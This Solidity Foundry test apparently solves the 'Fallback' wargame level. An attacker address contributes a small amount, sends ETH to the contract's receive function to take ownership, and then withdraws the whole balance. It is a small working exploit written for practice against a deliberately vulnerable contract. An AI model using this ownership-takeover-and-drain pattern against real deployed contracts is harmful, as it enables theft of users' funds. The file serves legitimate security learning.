// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    /*
     * 1. Deposit minimal amount using deposit function
     * 2. Call the receive function with a small amount of ETH
     * 3. Then drain the Fallback contract as we become the owner
     */

    Fallback public fallbackTest;
    address public attacker = address(0xBEEF);

    function setUp() public {
        fallbackTest = new Fallback();
        vm.deal(attacker, 1 ether);
    }

    function testFallbackAttack() public {
        vm.startPrank(attacker);
//        1
        fallbackTest.contribute{value: 0.0001 ether}();
        assertGt(fallbackTest.contributions(attacker), 0);

//        2
        (bool success, ) = address(fallbackTest).call{value: 0.01 ether}("");
        require(success);

//        3
        assertEq(fallbackTest.owner(), attacker);
        fallbackTest.withdraw();

        vm.stopPrank();
    }


}